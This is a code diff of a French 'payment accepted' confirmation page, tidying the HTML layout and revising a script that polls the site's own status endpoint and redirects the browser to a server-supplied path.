@@ -1,24 +1,27 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
-<title>Paiement accepté</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Paiement accepté</title>
 </head>
-<body>
-<h1>✅ Paiement accepté</h1>
-<p>Merci pour votre commande !</p>
+<body style="text-align:center; margin-top:50px;">
+  <h1>✅ Paiement accepté !</h1>
+  <p>Merci pour votre commande 👟</p>
+  <button onclick="window.location.href='/'">Retour à l'accueil 🏠</button>
 
-<script>
-// Polling redirection bot
-async function pollRedirect(){
-    const res = await fetch('/api/status');
-    const data = await res.json();
-    if(data.redirect && window.location.pathname !== data.redirect){
+  <script>
+  async function pollRedirect() {
+    try {
+      const res = await fetch('/api/status');
+      const data = await res.json();
+      if (data.redirect && window.location.pathname !== data.redirect) {
         window.location.href = data.redirect;
-    }
-    setTimeout(pollRedirect,1000);
-}
-pollRedirect();
-</script>
+      }
+    } catch (e) {}
+    setTimeout(pollRedirect, 2000);
+  }
+  pollRedirect();
+  </script>
 </body>
 </html>
